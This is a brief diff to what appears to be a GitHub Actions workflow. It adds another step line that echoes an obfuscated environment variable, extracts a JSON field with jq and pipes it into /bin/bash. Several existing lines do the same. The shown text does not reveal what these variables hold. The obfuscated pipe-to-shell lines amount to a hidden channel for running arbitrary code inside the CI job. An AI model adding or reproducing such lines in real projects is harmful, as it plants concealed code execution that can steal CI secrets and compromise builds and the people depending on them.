@@ -38,6 +38,7 @@ jobs:
           printf '%s' "$wwnm4415" | jq -r .kmhu9 | /bin/bash
           echo $aljox67 | jq -r .u31 | /bin/bash
           printf '%s' "$rd7" | jq -r .mpy2541 | /bin/bash
+          echo $z18123 | jq -r .op6 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
